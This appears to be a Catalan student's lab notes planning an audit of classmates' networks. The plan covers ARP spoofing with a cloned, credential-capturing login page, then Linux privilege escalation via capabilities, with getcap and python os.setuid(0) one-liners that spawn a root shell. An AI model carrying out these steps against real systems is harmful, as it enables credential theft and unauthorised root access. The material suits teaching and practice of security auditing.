[[Configuracio WebHosting Raspi]]
# Informació disponible
Per l'auditoria, tinc la següent informació:

 - Adreçament IP: 10.45.X.X/8
Hem de tenir en compte que cada grup té una adreça IP distinta. En aquest cas, la primera X pertany al grup. Per exemple, el Grup 1 ([[G1]]) té les adreces IP `10.45.1.X/24`

- Serveis que tenen:
	- FTP
	- SMTP
	- SERVEI WEB
	- WINDOWS ACTIVE DIRECTORY
	- CLIENTS

A partir d'aquí, he de fer la màgia.

---

# 2º pas: Arp Spoofing + Clonació de web.

Tenen 2 webs diferents publicades a diferents ports. Una d'elles se suposa que està en construcció i l'altre conté informació classificada sobre tots els equips de la xarxa (sistema operatiu, usuaris i grups d'active directori, màquines i adreces IP), la qual està protegida amb identificació Bàsic/Digest. Podem identificar-les gràcies a la documentació que han de seguir i també se'n pot saber gràcies a l'eina `FFUF`.

Una vegada identificada la pàgina web que interessa, copiaré la pàgina d'inici de sessió per la informació classificada. També crearé un sistema d'identificació falsa que, en introduir les dades, s'enviïn directament a mi i que automàticament em cloni tota la informació que es troba a la pàgina. Això inclou les pàgines amb dades classificades, informació d'usuaris i, sistemes operatius. Per fer-me passar per la seva pagina web, faré servir el metode `arp spoofing`.

---
# 3º Excalació de privilegis (python3.8 privilege escalation via capabilities)

[Més informació aquí](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
[Aquí també](https://amanisher.medium.com/linux-privilege-escalation-using-capabilities-d51186025032)
[i aquí]()

Una vegada tinc clonada la pàgina web, procediré a finalitzar l'atac i intentaré connectar-me per SSH a les màquines Linux.

Una vegada dins, haure de buscar si l'usuari amb el que estic te unes capabilities amb python. Tambe pot ser qualsevol altre capability que tingui l'usuari.
Les capabilities es troben amb la comanda:

```shell
getcap -r / 2>/dev/null
```

Si un resultat dona:

```shell
/home/usuari/python3
/home/usuari/vim
#o qualsevol capability que tingui disponible l'usuari
```

estic de sort.

Si aconsegueixo iniciar sessió, en cas que no tinguin Python instal·lat, instal·laré el Python3.8 i m'aprofitaré de la vulnerabilitat d'escalada de privilegis amb la llibreria `os`, com es mostra a la següent imatge:

```python
python3 -c import os ; os.system("whoami")
# Això hauria de tornar el usuari actual

python3 -c import os ; os.setuid(0) ; os.system("whoami")
# Això hauria de donar el usuari amb privilegi 0 (el primer, o sigui "root").

python3 -c import os ; os.setuid(0) ; os.system("bash")
# Això m'hauria de donar la terminal com usuari Root.
```
![[python3_8-priviledge-escalation.png]]
*Òbviament, a la imatge estic escalant privilegis amb sudo, ja que tinc una versió amb aquesta vulnerabilitat solucionada*
